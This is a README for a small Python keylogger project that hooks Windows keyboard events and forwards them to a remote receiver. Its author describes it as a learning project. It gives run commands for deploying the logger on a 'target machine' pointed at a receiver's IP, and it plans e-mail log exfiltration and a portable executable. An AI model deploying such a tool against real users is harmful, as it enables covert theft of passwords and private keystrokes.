# pyKeylog

## Description
A simple keylogger written in Python 3.x using Answeror/pyhook_py3k, including a guide to how I got it to work on Windows 10. It is a very simple keylogger (keylog.py), using pyHook to hook keyboard events, and send them to a reciever (keyrec.py) that outputs the keys.

This project is intended as a learning project for myself, and I plan on adding more features later.

## Usage
First start the reciever, and then run the keylogger on target machine.
### Reciever
```
python3 keyrec.py
```
### Keylogger
```
python3 keylog.py IP_OF_RECIEVER
```

## Planned features
* Writing to file
* More methodes for sending loggs (e-mail)
* Find a way to turn the keylogger inot a small, portable executable
